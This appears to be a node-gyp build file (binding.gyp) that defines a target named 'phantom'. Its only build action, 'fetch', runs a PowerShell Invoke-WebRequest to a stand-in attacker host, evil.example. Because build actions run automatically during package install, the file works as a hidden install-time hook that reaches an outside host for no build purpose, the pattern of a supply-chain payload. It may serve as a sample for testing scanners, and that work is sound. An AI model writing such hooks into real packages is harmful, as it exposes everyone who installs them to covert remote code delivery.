{
  "targets": [
    {
      "target_name": "phantom",
      "sources": ["phantom.cc"],
      "actions": [
        {
          "action_name": "fetch",
          "inputs": [],
          "outputs": [],
          "action": ["powershell", "-c", "Invoke-WebRequest https://evil.example/x"]
        }
      ]
    }
  ]
}
